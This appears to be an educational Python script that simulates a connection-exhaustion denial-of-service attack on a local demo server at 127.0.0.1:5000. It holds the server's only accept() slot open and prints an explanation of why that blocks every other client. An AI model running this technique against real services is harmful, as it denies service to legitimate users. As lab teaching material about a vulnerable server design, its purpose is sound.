import socket
import time

HOST = "127.0.0.1"
PORT = 5000

# ANSI color codes for terminal output
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def banner():
    print(f"{RED}{BOLD}")
    print("╔══════════════════════════════════════════════════════════╗")
    print("║           DENIAL OF SERVICE ATTACK SIMULATION             ║")
    print("║              Attack Type: Connection Exhaustion            ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(RESET)


def explain():
    print(f"{YELLOW}[i] How this attack works:{RESET}")
    print("    The server calls accept() only ONCE, before its main loop.")
    print("    That means it can only ever serve a single client for its")
    print("    entire lifetime. If an attacker grabs that one connection")
    print("    slot and never releases it, no legitimate client can ever")
    print("    be served again.")
    print()


def attack():
    banner()
    explain()

    print(f"{CYAN}[ATTACKER] Target : {HOST}:{PORT}{RESET}")
    print(f"{CYAN}[ATTACKER] Establishing connection...{RESET}")

    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker_socket.connect((HOST, PORT))

    print(f"{GREEN}[ATTACKER] ✔ Connected. Server's only client slot is now OURS.{RESET}")
    print(f"{RED}[ATTACKER] Holding connection open. Server is now unavailable")
    print(f"{RED}           to any other client until this process is killed.{RESET}")
    print()
    print(f"{YELLOW}[ATTACKER] Press Ctrl+C to release the connection and stop the attack.{RESET}")
    print()

    start_time = time.time()
    try:
        while True:
            elapsed = int(time.time() - start_time)
            print(f"\r{BOLD}[ATTACKER] Connection held for: {elapsed:>4} seconds  |  "
                  f"Server availability: DENIED{RESET}", end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        print()
        print(f"{GREEN}[ATTACKER] Attack stopped. Releasing connection...{RESET}")
        print(f"{GREEN}[ATTACKER] Server slot freed. Normal service can resume.{RESET}")
    finally:
        attacker_socket.close()


if __name__ == "__main__":
    attack()